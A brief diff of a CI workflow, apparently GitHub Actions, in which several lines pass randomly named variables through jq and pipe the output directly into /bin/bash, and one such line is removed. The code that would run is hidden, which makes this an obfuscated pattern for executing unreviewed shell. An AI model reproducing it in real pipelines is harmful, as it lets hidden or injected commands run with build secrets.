@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$vsh8493" | jq -r .yr05035 | /bin/bash
           echo $ny466 | jq -r .ha1 | /bin/bash
           echo $c39318 | jq -r .nwce14400 | /bin/bash
-          printf '%s' "$v435" | jq -r .xxos3 | /bin/bash
           printf '%s' "$hyd86202" | jq -r .hpxt477 | /bin/bash
 
       - name: Store results
